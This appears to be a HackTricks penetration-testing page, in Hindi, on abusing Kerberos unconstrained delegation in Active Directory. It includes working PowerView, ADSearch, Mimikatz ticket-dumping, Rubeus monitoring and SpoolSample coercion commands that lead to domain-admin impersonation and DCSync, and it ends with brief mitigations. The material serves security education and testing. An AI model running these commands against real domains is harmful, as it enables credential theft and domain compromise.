# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

यह एक विशेषता है जिसे एक Domain Administrator किसी भी **Computer** पर सेट कर सकता है जो डोमेन के अंदर है। फिर, जब भी कोई **उपयोगकर्ता उस Computer पर लॉगिन करता है**, उस उपयोगकर्ता का **TGT की एक प्रति** **DC द्वारा प्रदान किए गए TGS के अंदर भेजी जाएगी** **और LSASS में मेमोरी में सहेजी जाएगी**। इसलिए, यदि आपके पास मशीन पर Administrator विशेषाधिकार हैं, तो आप **टिकटों को डंप कर सकते हैं और किसी भी मशीन पर उपयोगकर्ताओं का अनुकरण कर सकते हैं**।

तो यदि एक डोमेन एडमिन "Unconstrained Delegation" विशेषता सक्रिय करके किसी Computer पर लॉगिन करता है, और आपके पास उस मशीन पर स्थानीय एडमिन विशेषाधिकार हैं, तो आप टिकट को डंप कर सकते हैं और डोमेन एडमिन का अनुकरण कहीं भी कर सकते हैं (डोमेन प्रिवेस्क)।

आप इस विशेषता के साथ Computer ऑब्जेक्ट्स को **खोज सकते हैं** यह जांचकर कि [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) विशेषता में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) शामिल है या नहीं। आप इसे ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ LDAP फ़िल्टर के साथ कर सकते हैं, जो powerview करता है:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Administrator (या पीड़ित उपयोगकर्ता) का टिकट मेमोरी में **Mimikatz** या **Rubeus** के साथ लोड करें [**Pass the Ticket**](pass-the-ticket.md)**.**\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Unconstrained delegation के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

यदि एक हमलावर **"Unconstrained Delegation" के लिए अनुमति प्राप्त कंप्यूटर को समझौता करने में सक्षम है**, तो वह **Print server** को **स्वचालित रूप से लॉगिन** करने के लिए **धोखा दे सकता है** जिससे **सर्वर की मेमोरी में एक TGT सहेजी जाएगी**।\
फिर, हमलावर **Print server कंप्यूटर खाते का अनुकरण करने के लिए Pass the Ticket हमले का प्रदर्शन कर सकता है**।

किसी भी मशीन के खिलाफ प्रिंट सर्वर को लॉगिन कराने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT एक डोमेन कंट्रोलर से है, तो आप एक [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) कर सकते हैं और DC से सभी हैश प्राप्त कर सकते हैं।\
[**इस हमले के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**यहाँ प्रमाणीकरण को मजबूर करने के अन्य तरीके हैं:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### शमन

- DA/एडमिन लॉगिन को विशिष्ट सेवाओं तक सीमित करें
- विशेषाधिकार प्राप्त खातों के लिए "खाता संवेदनशील है और इसे प्रतिनिधित्व नहीं किया जा सकता" सेट करें।

{{#include ../../banners/hacktricks-training.md}}
